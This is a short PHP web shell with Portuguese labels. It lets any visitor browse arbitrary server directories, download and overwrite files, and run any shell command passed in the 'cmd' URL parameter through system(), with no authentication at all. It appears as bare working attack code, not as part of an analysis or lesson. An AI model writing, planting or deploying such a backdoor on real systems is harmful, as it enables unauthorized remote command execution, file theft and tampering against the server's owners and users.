<?php
\$d=realpath(\$_GET['d']??'.');
if(!is_dir(\$d)) die('Diretório inválido');
if(isset(\$_POST['save']) && isset(\$_GET['file'])){
    file_put_contents(realpath(\$d.'/'.basename(\$_GET['file'])), \$_POST['content']);
    echo 'Arquivo salvo!<br>';
}
if(isset(\$_GET['edit'])){
    \$file=realpath(\$d.'/'.basename(\$_GET['edit']));
    echo '<a href=\"?d=' . urlencode(\$d) . '\">Voltar</a><br>';
    echo '<form method=post?action=>';
    echo '<textarea name=content rows=20 cols=80>' . htmlspecialchars(file_get_contents(\$file)) . '</textarea><br>';
    echo '<button name=save value=1>Salvar</button>';
    echo '</form>';
    exit;
}
echo '<h3>Diretório: ' . htmlspecialchars(\$d) . '</h3>';
echo '<a href=\"?d=' . urlencode(dirname(\$d)) . '\">Voltar</a><br><hr>';
foreach(scandir(\$d) as \$f){
    if(\$f=='.') continue;
    \$p=\$d.'/'.$f;
    if(is_dir(\$p))
        echo \"[DIR] <a href='?d=\" . urlencode(\$p) . \"'>\$f</a><br>\";
    else
        echo \"\$f <a href='?d=\" . urlencode(\$d) . \"&f=\" . urlencode(\$f) . \"'>↓</a> <a href='?d=\" . urlencode(\$d) . \"&edit=\" . urlencode(\$f) . \"'>editar</a><br>\";
}
if(isset(\$_GET['f'])){
    \$file=realpath(\$d.'/'.basename(\$_GET['f']));
    if(is_file(\$file)){
        header('Content-Disposition: attachment; filename='.basename(\$file));
        readfile(\$file);
        exit;
    }
}
if(isset(\$_GET['cmd'])){
    echo '<hr><pre>Comando: '.htmlspecialchars(\$_GET['cmd']).\"\n\"; system(\$_GET['cmd']); echo '</pre>';
}
?>
